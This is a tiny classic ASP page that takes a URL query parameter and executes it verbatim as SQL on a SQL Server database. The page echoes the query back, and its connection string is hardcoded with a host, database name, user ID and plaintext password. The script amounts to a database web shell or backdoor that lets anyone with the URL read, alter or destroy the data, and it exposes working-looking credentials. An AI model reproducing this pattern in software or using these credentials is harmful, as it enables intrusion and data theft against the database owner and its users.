<%@ LANGUAGE=VBScript CodePage=65001%>
<%    
response.ContentType="text/plain"
response.charset = "utf-8"
sql=Request.QueryString("p")
sql=replace(sql,"@","%")
Response.write(sql)
set cnn = Server.CreateObject("ADODB.Connection")   
cnn.Open "Driver={SQL Server};Server=hds-076.hichina.com;Database=hds0760218_db;UID=hds0760218;PWD=t2b5m6d1m0;"    
cnn.execute sql 
cnn.close()  
%>
